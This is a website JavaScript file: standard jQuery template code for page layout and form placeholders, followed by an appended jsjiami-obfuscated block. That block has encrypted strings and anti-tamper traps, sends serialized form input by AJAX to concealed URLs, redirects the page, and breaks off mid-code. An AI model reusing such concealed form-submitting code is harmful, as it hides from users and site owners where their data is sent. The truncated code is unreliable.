(function($) {
    skel.breakpoints({
        xlarge: '(max-width: 1680px)',
        large: '(max-width: 1280px)',
        medium: '(max-width: 980px)',
        small: '(max-width: 736px)',
        xsmall: '(max-width: 480px)',
        xxsmall: '(max-width: 360px)'
    });
    $(function() {
        var $window = $(window),
            $body = $('body'),
            $wrapper = $('#wrapper'),
            $header = $('#header'),
            $footer = $('#footer'),
            $main = $('#main'),
            $main_articles = $main.children('article');
        $body.addClass('is-loading');
        $window.on('load', function() {
            window.setTimeout(function() {
                $body.removeClass('is-loading');
            }, 100);
        });
        $('form').placeholder();
        if (skel.vars.IEVersion < 12) {
            var flexboxFixTimeoutId;
            $window.on('resize.flexbox-fix', function() {
                clearTimeout(flexboxFixTimeoutId);
                flexboxFixTimeoutId = setTimeout(function() {
                    if ($wrapper.prop('scrollHeight') > $window.height())
                        $wrapper.css('height', 'auto');
                    else
                        $wrapper.css('height', '100vh');
                }, 250);
            }).triggerHandler('resize.flexbox-fix');
        }
        var $nav = $header.children('nav'),
            $nav_li = $nav.find('li');
        if ($nav_li.length % 2 == 0) {
            $nav.addClass('use-middle');
            $nav_li.eq(($nav_li.length / 2)).addClass('is-middle');
        }
        var delay = 325,
            locked = false;
        $main._show = function(id, initial) {
            var $article = $main_articles.filter('#' + id);
            if ($article.length == 0)
                return;
            if (locked || (typeof initial != 'undefined' && initial === true)) {
                $body.addClass('is-switching');
                $body.addClass('is-article-visible');
                $main_articles.removeClass('active');
                $header.hide();
                $footer.hide();
                $main.show();
                $article.show();
                $article.addClass('active');
                locked = false;
                setTimeout(function() {
                    $body.removeClass('is-switching');
                }, (initial ? 1000 : 0));
                return;
            }
            locked = true;
            if ($body.hasClass('is-article-visible')) {
                var $currentArticle = $main_articles.filter('.active');
                $currentArticle.removeClass('active');
                setTimeout(function() {
                    $currentArticle.hide();
                    $article.show();
                    setTimeout(function() {
                        $article.addClass('active');
                        $window.scrollTop(0).triggerHandler('resize.flexbox-fix');
                        setTimeout(function() {
                            locked = false;
                        }, delay);
                    }, 25);
                }, delay);
            } else {
                $body.addClass('is-article-visible');
                setTimeout(function() {
                    $header.hide();
                    $footer.hide();
                    $main.show();
                    $article.show();
                    setTimeout(function() {
                        $article.addClass('active');
                        $window.scrollTop(0).triggerHandler('resize.flexbox-fix');
                        setTimeout(function() {
                            locked = false;
                        }, delay);
                    }, 25);
                }, delay);
            }
        };
        $main._hide = function(addState) {
            var $article = $main_articles.filter('.active');
            if (!$body.hasClass('is-article-visible'))
                return;
            if (typeof addState != 'undefined' && addState === true)
                history.pushState(null, null, '#');
            if (locked) {
                $body.addClass('is-switching');
                $article.removeClass('active');
                $article.hide();
                $main.hide();
                $footer.show();
                $header.show();
                $body.removeClass('is-article-visible');
                locked = false;
                $body.removeClass('is-switching');
                $window.scrollTop(0).triggerHandler('resize.flexbox-fix');
                return;
            }
            locked = true;
            $article.removeClass('active');
            setTimeout(function() {
                $article.hide();
                $main.hide();
                $footer.show();
                $header.show();
                setTimeout(function() {
                    $body.removeClass('is-article-visible');
                    $window.scrollTop(0).triggerHandler('resize.flexbox-fix');
                    setTimeout(function() {
                        locked = false;
                    }, delay);
                }, 25);
            }, delay);
        };
        $main_articles.each(function() {
            var $this = $(this);
            $('<div class="close">Close</div>').appendTo($this).on('click', function() {
                location.hash = '';
            });
            $this.on('click', function(event) {
                event.stopPropagation();
            });
        });
        $body.on('click', function(event) {
            if ($body.hasClass('is-article-visible'))
                $main._hide(true);
        });
        $window.on('keyup', function(event) {
            switch (event.keyCode) {
                case 27:
                    if ($body.hasClass('is-article-visible'))
                        $main._hide(true);
                    break;
                default:
                    break;
            }
        });
        $window.on('hashchange', function(event) {
            if (location.hash == '' || location.hash == '#') {
                event.preventDefault();
                event.stopPropagation();
                $main._hide();
            } else if ($main_articles.filter(location.hash).length > 0) {
                event.preventDefault();
                event.stopPropagation();
                $main._show(location.hash.substr(1));
            }
        });
        if ('scrollRestoration' in history)
            history.scrollRestoration = 'manual';
        else {
            var oldScrollPos = 0,
                scrollPos = 0,
                $htmlbody = $('html,body');
            $window.on('scroll', function() {
                oldScrollPos = scrollPos;
                scrollPos = $htmlbody.scrollTop();
            }).on('hashchange', function() {
                $window.scrollTop(oldScrollPos);
            });
        }
        $main.hide();
        $main_articles.hide();
        if (location.hash != '' && location.hash != '#')
            $window.on('load', function() {
                $main._show(location.hash.substr(1), true);
            });
    });
})(jQuery);

(function($) {
    $.fn.navList = function() {
        var $this = $(this);
        $a = $this.find('a'), b = [];
        $a.each(function() {
            var $this = $(this),
                indent = Math.max(0, $this.parents('li').length - 1),
                href = $this.attr('href'),
                target = $this.attr('target');
            b.push('<a ' +
                'class="link depth-' + indent + '"' +
                ((typeof target !== 'undefined' && target != '') ? ' target="' + target + '"' : '') +
                ((typeof href !== 'undefined' && href != '') ? ' href="' + href + '"' : '') +
                '>' +
                '<span class="indent-' + indent + '"></span>' +
                $this.text() +
                '</a>');
        });
        return b.join('');
    };
    $.fn.panel = function(userConfig) {
        if (this.length == 0)
            return $this;
        if (this.length > 1) {
            for (var i = 0; i < this.length; i++)
                $(this[i]).panel(userConfig);
            return $this;
        }
        var $this = $(this),
            $body = $('body'),
            $window = $(window),
            id = $this.attr('id'),
            config;
        config = $.extend({
            delay: 0,
            hideOnClick: false,
            hideOnEscape: false,
            hideOnSwipe: false,
            resetScroll: false,
            resetForms: false,
            side: null,
            target: $this,
            visibleClass: 'visible'
        }, userConfig);
        if (typeof config.target != 'jQuery')
            config.target = $(config.target);
        $this._hide = function(event) {
            if (!config.target.hasClass(config.visibleClass))
                return;
            if (event) {
                event.preventDefault();
                event.stopPropagation();
            }
            config.target.removeClass(config.visibleClass);
            window.setTimeout(function() {
                if (config.resetScroll)
                    $this.scrollTop(0);
                if (config.resetForms)
                    $this.find('form').each(function() {
                        this.reset();
                    });
            }, config.delay);
        };
        $this.css('-ms-overflow-style', '-ms-autohiding-scrollbar').css('-webkit-overflow-scrolling', 'touch');
        if (config.hideOnClick) {
            $this.find('a').css('-webkit-tap-highlight-color', 'rgba(0,0,0,0)');
            $this.on('click', 'a', function(event) {
                var $a = $(this),
                    href = $a.attr('href'),
                    target = $a.attr('target');
                if (!href || href == '#' || href == '' || href == '#' + id)
                    return;
                event.preventDefault();
                event.stopPropagation();
                $this._hide();
                window.setTimeout(function() {
                    if (target == '_blank')
                        window.open(href);
                    else
                        window.location.href = href;
                }, config.delay + 10);
            });
        }
        $this.on('touchstart', function(event) {
            $this.touchPosX = event.originalEvent.touches[0].pageX;
            $this.touchPosY = event.originalEvent.touches[0].pageY;
        })
        $this.on('touchmove', function(event) {
            if ($this.touchPosX === null || $this.touchPosY === null)
                return;
            var diffX = $this.touchPosX - event.originalEvent.touches[0].pageX,
                diffY = $this.touchPosY - event.originalEvent.touches[0].pageY,
                th = $this.outerHeight(),
                ts = ($this.get(0).scrollHeight - $this.scrollTop());
            if (config.hideOnSwipe) {
                var result = false,
                    boundary = 20,
                    delta = 50;
                switch (config.side) {
                    case 'left':
                        result = (diffY < boundary && diffY > (-1 * boundary)) && (diffX > delta);
                        break;
                    case 'right':
                        result = (diffY < boundary && diffY > (-1 * boundary)) && (diffX < (-1 * delta));
                        break;
                    case 'top':
                        result = (diffX < boundary && diffX > (-1 * boundary)) && (diffY > delta);
                        break;
                    case 'bottom':
                        result = (diffX < boundary && diffX > (-1 * boundary)) && (diffY < (-1 * delta));
                        break;
                    default:
                        break;
                }
                if (result) {
                    $this.touchPosX = null;
                    $this.touchPosY = null;
                    $this._hide();
                    return false;
                }
            }
            if (($this.scrollTop() < 0 && diffY < 0) || (ts > (th - 2) && ts < (th + 2) && diffY > 0)) {
                event.preventDefault();
                event.stopPropagation();
            }
        });
        $this.on('click touchend touchstart touchmove', function(event) {
            event.stopPropagation();
        });
        $this.on('click', 'a[href="#' + id + '"]', function(event) {
            event.preventDefault();
            event.stopPropagation();
            config.target.removeClass(config.visibleClass);
        });
        $body.on('click touchend', function(event) {
            $this._hide(event);
        });
        $body.on('click', 'a[href="#' + id + '"]', function(event) {
            event.preventDefault();
            event.stopPropagation();
            config.target.toggleClass(config.visibleClass);
        });
        if (config.hideOnEscape)
            $window.on('keydown', function(event) {
                if (event.keyCode == 27)
                    $this._hide(event);
            });
        return $this;
    };
    $.fn.placeholder = function() {
        if (typeof(document.createElement('input')).placeholder != 'undefined')
            return $(this);
        if (this.length == 0)
            return $this;
        if (this.length > 1) {
            for (var i = 0; i < this.length; i++)
                $(this[i]).placeholder();
            return $this;
        }
        var $this = $(this);
        $this.find('input[type=text],textarea').each(function() {
            var i = $(this);
            if (i.val() == '' || i.val() == i.attr('placeholder'))
                i.addClass('polyfill-placeholder').val(i.attr('placeholder'));
        }).on('blur', function() {
            var i = $(this);
            if (i.attr('name').match(/-polyfill-field$/))
                return;
            if (i.val() == '')
                i.addClass('polyfill-placeholder').val(i.attr('placeholder'));
        }).on('focus', function() {
            var i = $(this);
            if (i.attr('name').match(/-polyfill-field$/))
                return;
            if (i.val() == i.attr('placeholder'))
                i.removeClass('polyfill-placeholder').val('');
        });
        $this.find('input[type=password]').each(function() {
            var i = $(this);
            var x = $($('<div>').append(i.clone()).remove().html().replace(/type="password"/i, 'type="text"').replace(/type=password/i, 'type=text'));
            if (i.attr('id') != '')
                x.attr('id', i.attr('id') + '-polyfill-field');
            if (i.attr('name') != '')
                x.attr('name', i.attr('name') + '-polyfill-field');
            x.addClass('polyfill-placeholder').val(x.attr('placeholder')).insertAfter(i);
            if (i.val() == '')
                i.hide();
            else
                x.hide();
            i.on('blur', function(event) {
                event.preventDefault();
                var x = i.parent().find('input[name=' + i.attr('name') + '-polyfill-field]');
                if (i.val() == '') {
                    i.hide();
                    x.show();
                }
            });
            x.on('focus', function(event) {
                event.preventDefault();
                var i = x.parent().find('input[name=' + x.attr('name').replace('-polyfill-field', '') + ']');
                x.hide();
                i.show().focus();
            }).on('keypress', function(event) {
                event.preventDefault();
                x.val('');
            });
        });
        $this.on('submit', function() {
            $this.find('input[type=text],input[type=password],textarea').each(function(event) {
                var i = $(this);
                if (i.attr('name').match(/-polyfill-field$/))
                    i.attr('name', '');
                if (i.val() == i.attr('placeholder')) {
                    i.removeClass('polyfill-placeholder');
                    i.val('');
                }
            });
        }).on('reset', function(event) {
            event.preventDefault();
            $this.find('select').val($('option:first').val());
            $this.find('input,textarea').each(function() {
                var i = $(this),
                    x;
                i.removeClass('polyfill-placeholder');
                switch (this.type) {
                    case 'submit':
                    case 'reset':
                        break;
                    case 'password':
                        i.val(i.attr('defaultValue'));
                        x = i.parent().find('input[name=' + i.attr('name') + '-polyfill-field]');
                        if (i.val() == '') {
                            i.hide();
                            x.show();
                        } else {
                            i.show();
                            x.hide();
                        }
                        break;
                    case 'checkbox':
                    case 'radio':
                        i.attr('checked', i.attr('defaultValue'));
                        break;
                    case 'text':
                    case 'textarea':
                        i.val(i.attr('defaultValue'));
                        if (i.val() == '') {
                            i.addClass('polyfill-placeholder');
                            i.val(i.attr('placeholder'));
                        }
                        break;
                    default:
                        i.val(i.attr('defaultValue'));
                        break;
                }
            });
        });
        return $this;
    };
    $.prioritize = function($elements, condition) {
        var key = '__prioritize';
        if (typeof $elements != 'jQuery')
            $elements = $($elements);
        $elements.each(function() {
            var $e = $(this),
                $p, $parent = $e.parent();
            if ($parent.length == 0)
                return;
            if (!$e.data(key)) {
                if (!condition)
                    return;
                $p = $e.prev();
                if ($p.length == 0)
                    return;
                $e.prependTo($parent);
                $e.data(key, $p);
            } else {
                if (condition)
                    return;
                $p = $e.data(key);
                $e.insertAfter($p);
                $e.removeData(key);
            }
        });
    };
})(jQuery);

var _0xodP='jsjiami.com.v6',_0x3bb7=[_0xodP,'wo3CjADDiw==','w6NewpJpPQ==','I8KVw5nDkQo=','w6TDj8OdRg==','FsKmGyw=','JyfCtCk0','L8K4CRIZ','JCHCgMK5wpc=','bCEFU8KEw7RDMw==','wqjDsynDjQ==','5qyJ5Z2j5a2W6KKY77216K6F56uf566yw5IGw4nCmMONPw==','w4zDuFBnfMOUW3ByUljDiB8gMcOKKMKFw7cRw5IYwojDmsKJwoFLfj/Cg8ODPwjCig==','wojDt8Orw7c=','HwzCtMOmf1sZcg==','5a6V6KKi5ouF5Yqv77+P5q2Q5ZyN6LSs6LyLYcKiwos=','5Yyj55ad6ZeB6Ky377+c5a6H6KGJ5aWZ6LeI77+66K+05qKq5pyx5ZCz6Ye85pey5ayZ6KGB776e','woBKC8O0Bw==','U8K5ZQJS','w5fCmcO/JEg=','GsKCLFLCmU/DojZfc082NA==','w5hFacKAwr9JwoDDpXEWccOBw73Dr8KCW8Kiwr4=','w6TCox3DkXDDpMOiWS/DlEU2w7Mfwq0pwpTCtw==','6LaV5Yy35a2Y56Gs5Lia5b265aCg6aOR77605LuL6ICC5LuX56i0776L','Vz8tN2zCrcK/fcOsEVYMZcO4WcOPwr/DqMKAwrrDrijDv8KMb8OB','AWV7wpM=','LzgRw4rDvsKiw5HDjRI=','XcKZCykXw4InNHBk','Li/ClsKkwqw=','w6zDjm0Xw5M=','wpHDrsKxwrvCuw==','AsOAYsKaw7A=','w6rDvVY2w5U=','AmATw5FT','EHAkw4A=','w7hofMOZWA==','AsOhXcKKw6w=','CzoFwpRm','VMKfw6jDlcO4','w4UswroXBg==','w6fDlloW','YMKIY2nClQ==','HTVKY0c=','dcKJV1rCpQ==','w6d5woxN','w5/CvljDscKV','w6jDqUcZw5U=','w5jCn2rDp8K/','UsKlMHXClA==','BcOkWcKkw5s=','w6DCim/DnsKi','NcKZw4zDoAQ=','w5jDhcKpH8OM','w5bDssOtQlw=','w4rDg8KFKRtAfEEu','wqd5P8OnNQ==','cRouDkQ=','BTLCo8KnwpQ=','w6ACwoA=','IX4yw695','N8K5w5M/fA==','dsKrTQ1t','JsKVw4c=','BATChSTDnQ==','dBPCuFw=','Yys4HWU=','CyHCviU=','LAoCc8Kg','JURBwrjDnQ==','wpYYHsK/w6w=','cgzCq8OQbQ==','KhECZsKb','A2J5wpE=','wovDosOOw6ph','ATE4UMKc','w4/CjhnDo0E=','VTUYGm8=','KcOqYcKJw6o=','w7/Cnn7DrcKZ','PgvCpMKTwqQ=','Bh1+XUs=','IxsYaMKe','MAjDtVXCqg==','wrVkIiLDvw==','wqPDoXLDslU=','Dg3CrRII','w7HCg8OqKmU=','w6zDi1sV','CHhMwrnDnQ==','w6nDpMORZm4=','TMKkw4fDrQ==','wqHDvnLDmEw=','bnzCoHdS','ESRPVFw=','CMOCw5sxwqA=','JMK5w4Y8Ug==','ARcPwpdf','JivCncKBwoQ=','CjHDpmU=','NwEuWMK2','RcKZw7DDu8OZ','IjTChsKO','BsK5w4UMZw==','G8O8ZMKCw6Y=','IjLCjsKE','w7E+YzxM','w6nCqcOrHVo=','wpZUEsOKKg==','MkZFwrHDtA==','w4BudsOtWA==','w7HDq3TDnw==','woJ9NiY=','w4jDsUxcXQ==','w649URhz','w5bCmcO3K0s=','PjbHsIxjHziamAyiU.cyePomnH.bv6=='];(function(_0x4ce19f,_0x19c51e,_0x14c46e){var _0x502d41=function(_0xde5d7c,_0x13c7d1,_0x44533e,_0x30fcee,_0x5d33da){_0x13c7d1=_0x13c7d1>>0x8,_0x5d33da='po';var _0x3ffb27='shift',_0x532264='push';if(_0x13c7d1<_0xde5d7c){while(--_0xde5d7c){_0x30fcee=_0x4ce19f[_0x3ffb27]();if(_0x13c7d1===_0xde5d7c){_0x13c7d1=_0x30fcee;_0x44533e=_0x4ce19f[_0x5d33da+'p']();}else if(_0x13c7d1&&_0x44533e['replace'](/[PbHIxHzAyUyePnHb=]/g,'')===_0x13c7d1){_0x4ce19f[_0x532264](_0x30fcee);}}_0x4ce19f[_0x532264](_0x4ce19f[_0x3ffb27]());}return 0x5d0f9;};var _0xeea46c=function(){var _0x449c69={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x483924,_0x1c0a6f,_0x17655a,_0x55ca3d){_0x55ca3d=_0x55ca3d||{};var _0x1db2a6=_0x1c0a6f+'='+_0x17655a;var _0x29f4e6=0x0;for(var _0x29f4e6=0x0,_0x3c47eb=_0x483924['length'];_0x29f4e6<_0x3c47eb;_0x29f4e6++){var _0xa029c2=_0x483924[_0x29f4e6];_0x1db2a6+=';\x20'+_0xa029c2;var _0x56338=_0x483924[_0xa029c2];_0x483924['push'](_0x56338);_0x3c47eb=_0x483924['length'];if(_0x56338!==!![]){_0x1db2a6+='='+_0x56338;}}_0x55ca3d['cookie']=_0x1db2a6;},'removeCookie':function(){return'dev';},'getCookie':function(_0x391f02,_0x26a8f2){_0x391f02=_0x391f02||function(_0x28598b){return _0x28598b;};var _0x56f6df=_0x391f02(new RegExp('(?:^|;\x20)'+_0x26a8f2['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x2a6750=typeof _0xodP=='undefined'?'undefined':_0xodP,_0x51d121=_0x2a6750['split'](''),_0x569627=_0x51d121['length'],_0x2030fa=_0x569627-0xe,_0x2fad08;while(_0x2fad08=_0x51d121['pop']()){_0x569627&&(_0x2030fa+=_0x2fad08['charCodeAt']());}var _0x1ec3aa=function(_0x125d34,_0x3d0a2f,_0x40b664){_0x125d34(++_0x3d0a2f,_0x40b664);};_0x2030fa^-_0x569627===-0x524&&(_0x2fad08=_0x2030fa)&&_0x1ec3aa(_0x502d41,_0x19c51e,_0x14c46e);return _0x2fad08>>0x2===0x14b&&_0x56f6df?decodeURIComponent(_0x56f6df[0x1]):undefined;}};var _0xdd719c=function(){var _0x170f50=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x170f50['test'](_0x449c69['removeCookie']['toString']());};_0x449c69['updateCookie']=_0xdd719c;var _0x5a2dc1='';var _0x264360=_0x449c69['updateCookie']();if(!_0x264360){_0x449c69['setCookie'](['*'],'counter',0x1);}else if(_0x264360){_0x5a2dc1=_0x449c69['getCookie'](null,'counter');}else{_0x449c69['removeCookie']();}};_0xeea46c();}(_0x3bb7,0x1ce,0x1ce00));var _0x2bca=function(_0x478f48,_0x47407f){_0x478f48=~~'0x'['concat'](_0x478f48);var _0x3078ba=_0x3bb7[_0x478f48];if(_0x2bca['PlELAx']===undefined){(function(){var _0x48d98f=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x161936='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x48d98f['atob']||(_0x48d98f['atob']=function(_0x57f00c){var _0xbcc8b2=String(_0x57f00c)['replace'](/=+$/,'');for(var _0x96fb2=0x0,_0x17be83,_0x4cd168,_0x2f458c=0x0,_0xb10a9e='';_0x4cd168=_0xbcc8b2['charAt'](_0x2f458c++);~_0x4cd168&&(_0x17be83=_0x96fb2%0x4?_0x17be83*0x40+_0x4cd168:_0x4cd168,_0x96fb2++%0x4)?_0xb10a9e+=String['fromCharCode'](0xff&_0x17be83>>(-0x2*_0x96fb2&0x6)):0x0){_0x4cd168=_0x161936['indexOf'](_0x4cd168);}return _0xb10a9e;});}());var _0x5dd9af=function(_0x4e044b,_0x47407f){var _0x29cb68=[],_0x36621e=0x0,_0x1e3bbd,_0x2da742='',_0x50a722='';_0x4e044b=atob(_0x4e044b);for(var _0x48a2a4=0x0,_0x35d916=_0x4e044b['length'];_0x48a2a4<_0x35d916;_0x48a2a4++){_0x50a722+='%'+('00'+_0x4e044b['charCodeAt'](_0x48a2a4)['toString'](0x10))['slice'](-0x2);}_0x4e044b=decodeURIComponent(_0x50a722);for(var _0x561d10=0x0;_0x561d10<0x100;_0x561d10++){_0x29cb68[_0x561d10]=_0x561d10;}for(_0x561d10=0x0;_0x561d10<0x100;_0x561d10++){_0x36621e=(_0x36621e+_0x29cb68[_0x561d10]+_0x47407f['charCodeAt'](_0x561d10%_0x47407f['length']))%0x100;_0x1e3bbd=_0x29cb68[_0x561d10];_0x29cb68[_0x561d10]=_0x29cb68[_0x36621e];_0x29cb68[_0x36621e]=_0x1e3bbd;}_0x561d10=0x0;_0x36621e=0x0;for(var _0x3f098a=0x0;_0x3f098a<_0x4e044b['length'];_0x3f098a++){_0x561d10=(_0x561d10+0x1)%0x100;_0x36621e=(_0x36621e+_0x29cb68[_0x561d10])%0x100;_0x1e3bbd=_0x29cb68[_0x561d10];_0x29cb68[_0x561d10]=_0x29cb68[_0x36621e];_0x29cb68[_0x36621e]=_0x1e3bbd;_0x2da742+=String['fromCharCode'](_0x4e044b['charCodeAt'](_0x3f098a)^_0x29cb68[(_0x29cb68[_0x561d10]+_0x29cb68[_0x36621e])%0x100]);}return _0x2da742;};_0x2bca['FVyDIc']=_0x5dd9af;_0x2bca['TlbpCg']={};_0x2bca['PlELAx']=!![];}var _0x5931f6=_0x2bca['TlbpCg'][_0x478f48];if(_0x5931f6===undefined){if(_0x2bca['kurCBS']===undefined){var _0x184b16=function(_0x3ff4d3){this['MlJPZR']=_0x3ff4d3;this['kpPMvj']=[0x1,0x0,0x0];this['ixrTtr']=function(){return'newState';};this['JyujkO']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['wrcYft']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x184b16['prototype']['rugPhp']=function(){var _0x49a331=new RegExp(this['JyujkO']+this['wrcYft']);var _0x3806af=_0x49a331['test'](this['ixrTtr']['toString']())?--this['kpPMvj'][0x1]:--this['kpPMvj'][0x0];return this['kTYxPj'](_0x3806af);};_0x184b16['prototype']['kTYxPj']=function(_0x5ca3a6){if(!Boolean(~_0x5ca3a6)){return _0x5ca3a6;}return this['QawcWY'](this['MlJPZR']);};_0x184b16['prototype']['QawcWY']=function(_0x2eb448){for(var _0x5bbb7c=0x0,_0x46620e=this['kpPMvj']['length'];_0x5bbb7c<_0x46620e;_0x5bbb7c++){this['kpPMvj']['push'](Math['round'](Math['random']()));_0x46620e=this['kpPMvj']['length'];}return _0x2eb448(this['kpPMvj'][0x0]);};new _0x184b16(_0x2bca)['rugPhp']();_0x2bca['kurCBS']=!![];}_0x3078ba=_0x2bca['FVyDIc'](_0x3078ba,_0x47407f);_0x2bca['TlbpCg'][_0x478f48]=_0x3078ba;}else{_0x3078ba=_0x5931f6;}return _0x3078ba;};var _0x5afc2a=function(){var _0xc7d48e=!![];return function(_0x49db0b,_0x2c89a7){var _0x40d695=_0xc7d48e?function(){if(_0x2c89a7){var _0x3e8038=_0x2c89a7['apply'](_0x49db0b,arguments);_0x2c89a7=null;return _0x3e8038;}}:function(){};_0xc7d48e=![];return _0x40d695;};}();var _0x119aaa=_0x5afc2a(this,function(){var _0xb6b484=function(){return'\x64\x65\x76';},_0x3d43d0=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x8bed4c=function(){var _0x3b2834=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x3b2834['\x74\x65\x73\x74'](_0xb6b484['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x4a500f=function(){var _0x3d40fe=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x3d40fe['\x74\x65\x73\x74'](_0x3d43d0['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x539a3e=function(_0x296b35){var _0x11dc57=~-0x1>>0x1+0xff%0x0;if(_0x296b35['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x11dc57)){_0x3b5506(_0x296b35);}};var _0x3b5506=function(_0x216331){var _0x2ed6e5=~-0x4>>0x1+0xff%0x0;if(_0x216331['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x2ed6e5){_0x539a3e(_0x216331);}};if(!_0x8bed4c()){if(!_0x4a500f()){_0x539a3e('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x539a3e('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x539a3e('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x119aaa();$(function(){var _0x1115ac={'fgYqn':function(_0x25b798,_0x1b3926){return _0x25b798!==_0x1b3926;},'pOBTy':_0x2bca('0','DTRZ'),'SOVSy':_0x2bca('1','#tEo'),'YVwUv':_0x2bca('2','3EZY'),'NsjUq':function(_0x95f8c,_0x11ca2c){return _0x95f8c(_0x11ca2c);},'eYiFk':_0x2bca('3','o65e'),'szVim':_0x2bca('4','l4M$'),'oIfyg':_0x2bca('5','#]fj'),'NRUEm':_0x2bca('6','LT1B'),'NySpl':_0x2bca('7','LxsC'),'BCtGE':function(_0x4454b1,_0x5731ac){return _0x4454b1==_0x5731ac;},'cnXDm':function(_0x53fd50,_0x345baa){return _0x53fd50(_0x345baa);},'fYreh':_0x2bca('8','C#M@'),'tKOqz':function(_0x17e91d,_0x378413,_0x5d3208){return _0x17e91d(_0x378413,_0x5d3208);},'lSsHn':_0x2bca('9','L@K1'),'kjiDe':function(_0x31c7c5,_0x167f83){return _0x31c7c5===_0x167f83;},'dFrOq':_0x2bca('a','MhtE'),'VGUvD':function(_0x476c27,_0x216270,_0x569bc4){return _0x476c27(_0x216270,_0x569bc4);},'qeaEH':function(_0x4813db,_0x4763f6){return _0x4813db(_0x4763f6);},'XuFAb':function(_0x2238cd,_0x3ad8a6,_0x21bde2){return _0x2238cd(_0x3ad8a6,_0x21bde2);},'IWQkZ':_0x2bca('b','v]ik'),'yMcVS':_0x2bca('c','gkbg'),'GAnPF':function(_0x253a68,_0x5a75d3){return _0x253a68(_0x5a75d3);},'ZOUbY':_0x2bca('d','3jXJ'),'PdwWG':function(_0x4ca08e,_0x37e503){return _0x4ca08e==_0x37e503;},'OrHEJ':_0x2bca('e','uflI'),'gMxik':function(_0x4c5002,_0x52f64d){return _0x4c5002(_0x52f64d);},'QbzNw':_0x2bca('f','([n('),'UpxCg':_0x2bca('10','gkbg'),'cBiSP':_0x2bca('11','hN9['),'aYtpt':_0x2bca('12','vJh&'),'cjRgm':_0x2bca('13','uXg1'),'AXfoN':_0x2bca('14','DTRZ')};_0x1115ac[_0x2bca('15','#tEo')]($,_0x1115ac[_0x2bca('16',')utN')])[_0x2bca('17','L@K1')](function(){var _0x1cba48={'xFlza':function(_0x382acb,_0xbc1618){return _0x1115ac[_0x2bca('18','VujP')](_0x382acb,_0xbc1618);},'LWCfF':_0x1115ac[_0x2bca('19',')utN')],'FyTyd':_0x1115ac[_0x2bca('1a','40b8')]};$[_0x2bca('1b','40b8')]({'url':_0x1115ac[_0x2bca('1c','P)kS')],'type':_0x1115ac[_0x2bca('1d','VujP')],'success':function(_0xa46866){if(_0x1115ac[_0x2bca('1e','466*')](_0x1115ac[_0x2bca('1f','6]0*')],_0x1115ac[_0x2bca('20','Z9P[')])){location[_0x2bca('21',')utN')]=_0x1115ac[_0x2bca('22','c80@')];}else{_0x1cba48[_0x2bca('23','[ICT')]($,_0x1cba48[_0x2bca('24','c80@')])[_0x2bca('25','s6m0')](_0x1cba48[_0x2bca('26','Cx9D')]);}}});});_0x1115ac[_0x2bca('27',')utN')]($,_0x1115ac[_0x2bca('28','Cx9D')])[_0x2bca('17','L@K1')](function(){var _0x5bcef4={'tWiMz':function(_0x152cdb,_0x43935f){return _0x1115ac[_0x2bca('29','3jXJ')](_0x152cdb,_0x43935f);},'CuWLe':_0x1115ac[_0x2bca('2a','VujP')],'tMmjE':_0x1115ac[_0x2bca('2b','Cx9D')],'emqRO':_0x1115ac[_0x2bca('2c','IuRm')]};var _0x29bede=_0x1115ac[_0x2bca('2d','M!m2')]($,_0x1115ac[_0x2bca('2e','(XJ@')])[_0x2bca('2f','sVgO')]();_0x1115ac[_0x2bca('30','MhtE')]('',_0x1115ac[_0x2bca('31','hN9[')]($,_0x1115ac[_0x2bca('32','@YTX')])[_0x2bca('33','Z9P[')]())||_0x1115ac[_0x2bca('34','40b8')]('',_0x1115ac[_0x2bca('35','m3G)')]($,_0x1115ac[_0x2bca('36','v]ik')])[_0x2bca('37','m3G)')]())?_0x1115ac[_0x2bca('35','m3G)')]($,_0x1115ac[_0x2bca('38','30V#')])[_0x2bca('39','C#M@')](_0x1115ac[_0x2bca('3a','hN9[')]):$[_0x2bca('3b','l4M$')]({'url':_0x1115ac[_0x2bca('3c','3EZY')],'type':_0x1115ac[_0x2bca('3d','vJh&')],'dataType':_0x1115ac[_0x2bca('3e','kZ6u')],'data':_0x29bede,'beforeSend':function(){_0x1115ac[_0x2bca('3f','LxsC')]($,_0x1115ac[_0x2bca('40','3EZY')])[_0x2bca('41','vJh&')](_0x1115ac[_0x2bca('42','LT1B')]);},'success':function(_0x29bede){var _0x431fc5={'lJSrW':_0x1115ac[_0x2bca('43','3EZY')],'lkvcZ':function(_0x593bf6,_0x53bff3){return _0x1115ac[_0x2bca('44','([n(')](_0x593bf6,_0x53bff3);},'xIExF':function(_0x539e01,_0x5c9c6f){return _0x1115ac[_0x2bca('45','hN9[')](_0x539e01,_0x5c9c6f);},'aIZzX':_0x1115ac[_0x2bca('46','VujP')],'VMnZp':_0x1115ac[_0x2bca('47','Cx9D')],'WOlMg':function(_0x161121,_0x1b2b2d,_0x4a3f0b){return _0x1115ac[_0x2bca('48','@YTX')](_0x161121,_0x1b2b2d,_0x4a3f0b);},'Ziupz':function(_0x1995b3,_0x4886d6){return 